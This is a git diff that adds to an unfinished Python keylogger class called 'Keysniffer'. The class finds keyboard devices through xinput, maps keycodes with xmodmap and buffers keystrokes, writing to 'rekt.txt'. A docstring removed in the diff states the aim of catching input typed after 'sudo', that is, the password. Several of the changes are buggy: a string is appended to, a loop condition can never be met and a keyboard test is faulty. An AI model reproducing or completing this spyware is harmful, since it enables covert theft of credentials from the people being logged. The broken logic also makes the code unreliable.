@@ -3,18 +3,53 @@ import subprocess
 import os
 import re
 
+
 class Keysniffer():
         def __init__(self, xinput_bin='/usr/bin/xinput', outfile='rekt.txt'):
                self.xinput = xinput_bin
                self.keycodes = []
                self.outfile = outfile
-               self.keyboard = self.getKeyboardID()
+               self.keyboards = self.getKeyboards()
+
+               self.getKeyCodes()
         
-        def getKeyboardID(self):
+
+        def getKeyboards(self):
                 """
                 Get the device ID for the keyboard from xinput
                 """
-                pass
+                # Exec 'xinput list' to get available input devices
+                try:
+                        xinput_list = subprocess.Popen((self.xinput, 'list'), 
+                                stdout=subprocess.PIPE,
+                                universal_newlines=True)
+                except OSError as err:
+                        print('[Error]: '.format(err))
+                
+                dev_ids = []
+                for line in xinput_list.stdout:
+                        line = str(line).split()
+                        # get devices IDs for devices that have keyboard in the name and
+                        # are not Virtual devices.
+                        if ("Keyboard" or "keyboard") in line[:-3] and "Virtual" not in line:
+                                find_id = re.compile('id=([0-9])')      # regex for id string
+                                for item in line:
+                                        if find_id.match(item):
+                                                # append the last character, which should be
+                                                # the numeric device ID.
+                                                dev_ids.append(line[line.index(item)][-1])
+                                        else:
+                                                pass
+                        else:
+                                pass
+
+                # If dev_ids has less than 1 value, no keyboard devices were found
+                if len(dev_ids) < 1: 
+                        print("No keyboard devices found.")
+                        return
+                # else, return the list of device IDs.
+                else: return dev_ids
+
 
         def getKeyCodes(self):
                 """
@@ -23,8 +58,7 @@ class Keysniffer():
                 # Call xmodmap to get keycode mapping, pipe to stdout
                 modmap_out = subprocess.Popen(('xmodmap', '-pm', '-pk'), 
                         stdout=subprocess.PIPE,
-                        universal_newlines=True
-                        )
+                        universal_newlines=True)
 
                 # Iterate through output of xmodmap by line, split line into its items,
                 # and append that each list of items to codes[] list
@@ -76,6 +110,8 @@ class Keysniffer():
                 for char in search:
                         if str(char).isalnum():
                                 search_str.append('(' + char + ')')
+                        # TODO: add methods to check for non-alphanumeric characters like
+                        # punctuation symbols and others.
                         else:
                                 pass
                 
@@ -88,26 +124,40 @@ class Keysniffer():
                                 if char in code: result.append(code[0])
                 return result
 
+
         def keySniff(self):
                 """
-                Execute xinput to begin sniffing keycodes, search for 'sudo' key 
-                combination and then capture the input the comes after the next press 
-                of 'Enter' up to the next time 'Enter' is pressed.
+                Execute xinput to begin sniffing keycodes. Fill a list buffer 
                 """
 
                 # Call xinput to start sniffing keycodes and pipe its output 
-                keystream = subprocess.Popen((self.xinput, ), stdout=subprocess.PIPE, 
-                        universal_newlines=True)
+                keystream = subprocess.Popen((self.xinput, ), 
+                                stdout=subprocess.PIPE, 
+                                universal_newlines=True)
                 
                 # Create a list to hold keycodes, fill it with 4 keycodes at a time
-                code_buf = []
-                while len(code_buf) > 5:
-                        for line in keystream.stdout:
-                                if "release" in line:
+                enter_code = ''
+                for code in self.keycodes:
+                        if code[1] == '(Enter)':
+                                enter_code.append(code[1])
+                                break
+                        else:
+                                continue
+                
+                stream_buffer = []
+                for line in keystream.stdout:
+                        while len(stream_buffer) > 64:
+                                if "release" in line and enter_code not in line:
                                         code = str(line).strip().split()
-                                        code_buf.append(code[2])
-                                else:
-                                        continue
+                                        stream_buffer.append(code[-1])
+                                elif enter_code in line:
+                                        stream_buffer.append('<newline>')
+                                        break
+                
+                converted_stream = self.codesToKeys(stream_buffer)
+
+                
+                                        
                 
                 
 
